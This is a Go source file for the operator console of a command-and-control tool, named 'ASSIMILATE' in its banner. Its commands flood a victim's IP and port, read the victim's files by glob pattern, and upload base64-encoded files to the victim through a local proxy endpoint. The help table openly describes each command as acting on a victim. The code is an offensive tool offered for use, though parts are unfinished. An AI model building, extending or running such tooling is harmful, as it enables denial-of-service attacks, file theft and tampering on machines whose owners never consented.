package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/olekukonko/tablewriter"
)

// Edit later
type comData struct {
	Cmd  string `json:"cmd"`
	Data string `json:"data"`
}

const proxyURL = "http://localhost:8888/proxy"

type option struct {
	Cmd        string
	ParamCount int //set the value to -1 if we do not care about the amount
	Action     func(params ...interface{})
	//in order to make this work, all functions that are in options have this as a parameter, but will be secure
	//because we are checking that the amount of params to pass equals the amount we set, and since we are always
	//passing in an array we must break that array apart in the function itself.
	//We set this to be params ...interface{} so it can also work with empty calls
}

// edit later
var options = []option{
	{"/help", 0, specificHelp},
	{"/clear", 0, CallClear},
	{"/exit", 0, exitFunction},
	{"/list", 0, nil},
	{"/floodping", -1, floodping},
	{"/supercat", -1, supercat},
	{"/writefile", -1, writefile},
}

// menu banner
func displayMenu() {
	//clear the terminal
	CallClear()
	//title card
	fmt.Println("_______  _______  _______ _________ _______ _________ _        _______ _________ _______")
	fmt.Println("(  ___  )(  ____ \\(  ____ \\__   __/(       )\\__   __/( \\      (  ___  )\\__   __/(  ____ \\")
	fmt.Println("| (   ) || (    \\/| (    \\/   ) (   | () () |   ) (   | (      | (   ) |   ) (   | (    \\/")
	fmt.Println("| (___) || (_____ | (_____    | |   | || || |   | |   | |      | (___) |   | |   | (__    ")
	fmt.Println("|  ___  |(_____  )(_____  )   | |   | |(_)| |   | |   | |      |  ___  |   | |   |  __)   ")
	fmt.Println("| (   ) |      ) |      ) |   | |   | |   | |   | |   | |      | (   ) |   | |   | (      ")
	fmt.Println("| )   ( |/\\____) |/\\____) |___) (___| )   ( |___) (___| (____/\\| )   ( |   | |   | (____/\\")
	fmt.Println("|/     \\|\\_______)\\_______)\\_______/|/     \\|\\_______/(_______/|/     \\|   )_(   (_______/")
	fmt.Print(("\n\n\n\n(C2C) > "))
	time.Sleep(500 * time.Millisecond)
}

func floodping(params ...interface{}) {
	paramsForFloodPing, ok1 := params[0].([]string)
	if !ok1 || len(paramsForFloodPing) < 2 {
		fmt.Println("floodping requires a IP and port")
		return
	}
	ipport := paramsForFloodPing[0] + ":" + paramsForFloodPing[1]

	data := comData{
		Cmd:  "floodping",
		Data: ipport,
	}

	jsondata, err := json.Marshal(data)

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Println("Response success:", response.Status)
	} else {
		fmt.Println("Response Failed:", response.Status)
	}

}

func supercat(params ...interface{}) {
	paramsForSupercat, ok1 := params[0].([]string)
	if !ok1 || len(paramsForSupercat) < 1 {
		fmt.Println("supercat requires at least 1 file pattern")
		return
	}
	fileglob := paramsForSupercat[0]

	data := comData{
		Cmd:  "supercat",
		Data: fileglob,
	}

	jsondata, err := json.Marshal(data)

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))

	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Println("Response success:", response.Status)
	} else {
		fmt.Println("Response Failed:", response.Status)
	}

}

func writefile(params ...interface{}) {
	paramsWritefile, ok := params[0].([]string)
	if !ok || len(paramsWritefile) < 1 {
		fmt.Println("writefile requires at least 1 file filename")
		return
	}

	type filePayload struct {
		Filename string `json:"filename"`
		Content  string `json:"content"`
	}

	filesData := []filePayload{}

	for _, filename := range paramsWritefile {
		contents, err := os.ReadFile(filename)
		if err != nil {
			fmt.Printf("Can't read %s, error: %v\n", filename, err)
			continue
		}
		filesData = append(filesData, filePayload{
			Filename: filepath.Base(filename),
			Content:  base64.StdEncoding.EncodeToString(contents),
		})
	}

	data := map[string]interface{}{
		"cmd":  "writefile",
		"file": filesData,
	}

	jsondata, err := json.Marshal(data)
	if err != nil {
		fmt.Println("There is an error:", err)
		return
	}

	response, err := http.Post(proxyURL, "application/json", bytes.NewBuffer(jsondata))
	if err != nil {
		fmt.Println("There is an error:", err)
		return
	}

	defer response.Body.Close()

	if response.StatusCode == http.StatusOK {
		fmt.Println("Response success:", response.Status)
	} else {
		fmt.Println("Response Failed:", response.Status)
	}
}

func proxyHandler(w http.ResponseWriter, r *http.Request) {

	fmt.Println("Message recieved from: ", r.Host)

	message, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println("There was an error: ", err)
		return
	}

	defer r.Body.Close()

	fmt.Println("Message: ", string(message))

}

// prints when an invalid command is entered
func genericHelp() {
	fmt.Println("Invalid Command, use the /help command for details of all the commands")
}

func specificHelp(params ...interface{}) {
	// Create a new table writer
	table := tablewriter.NewWriter(os.Stdout)

	// Set headers for the table
	table.SetHeader([]string{"Command", "Parameters", "Description"})

	// Add rows to the table
	table.Append([]string{"/help", "None", "Prints out table of commands with parameters and descriptions"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/clear", "None", "Clear terminal window"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/exit", "None", "Safely exit the C2C terminal application"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/list", "None", "Curently still in progress"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/floodping", "IP, Port", "floodping for victim"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/supercat", "file pattern", "cats victims file"})
	table.Append([]string{"", "", ""})
	table.Append([]string{"/writefile", "file", "write a file to the vicitim"})

	// Render the table
	table.Render()
}

// exits the program
func exitFunction(params ...interface{}) {
	exitStr := "Goodbye\n"
	for i := 0; i < len(exitStr); i++ {
		fmt.Print(string(exitStr[i]))
		time.Sleep(100 * time.Millisecond)
	}
	os.Exit(0)
	//return 1
}

// Handler for menu
func Handler() {

	var command string
	var commandParamList []string
	fmt.Print(("(C2C)> "))
	// Create a new scanner to read from standard input
	scanner := bufio.NewScanner(os.Stdin)
	// Read the user input
	scanner.Scan()
	userInput := scanner.Text()
	if userInput == "" {
		return
	}
	//finds the end of the initial command
	spaceIndex := strings.Index(userInput, " ")
	if spaceIndex == -1 {
		command = userInput
	} else {
		//the command
		command = userInput[:spaceIndex]
		commandParams := userInput[spaceIndex+1:]
		//all the subsequent parameters
		commandParamList = strings.Fields(commandParams)
	}
	for _, b := range options {
		//enter only if command is a real command
		if b.Cmd == command {
			if hasParamCount(len(commandParamList), b.ParamCount) {
				//pass all command parameters (of any size)
				b.Action(commandParamList)
				return
			}
		}
	}

	//provide the user a default help for entering commands
	genericHelp()

}

func hasParamCount(count int, target int) bool {
	return count == target || target == -1
}

// code snippet taken from https://stackoverflow.com/questions/22891644/how-can-i-clear-the-terminal-screen-in-go
var clear map[string]func() //create a map for storing clear funcs

func init() {
	clear = make(map[string]func()) //Initialize it
	clear["linux"] = func() {
		cmd := exec.Command("clear") //Linux example, its tested
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
	clear["windows"] = func() {
		cmd := exec.Command("cmd", "/c", "cls") //Windows example, its tested
		cmd.Stdout = os.Stdout
		cmd.Run()
	}
}

func CallClear(params ...interface{}) {
	value, ok := clear[runtime.GOOS] //runtime.GOOS -> linux, windows, darwin etc.
	if ok {                          //if we defined a clear func for that platform:
		value() //we execute it
	} else { //unsupported platform
		panic("Your platform is unsupported! I can't clear terminal screen :(\n")
	}
}

// runs in a goroutine
func startServer() {

	http.HandleFunc("/proxy", proxyHandler)

	fmt.Println("Running on localhost:8888")

	err := http.ListenAndServe(":8888", nil)
	if err != nil {
		fmt.Println("The Server failed to run:", err)
	}

}

// runs in a goroutine
func startMenu() {
	for {
		Handler()
		time.Sleep(500 * time.Millisecond)
	}
}

func main() {
	//	Start of the menu func
	go startMenu()

	//	start of the server func
	go startServer()

	displayMenu()

	//	Makes it so the server and
	// 	menu run concurrently together
	select {}
}
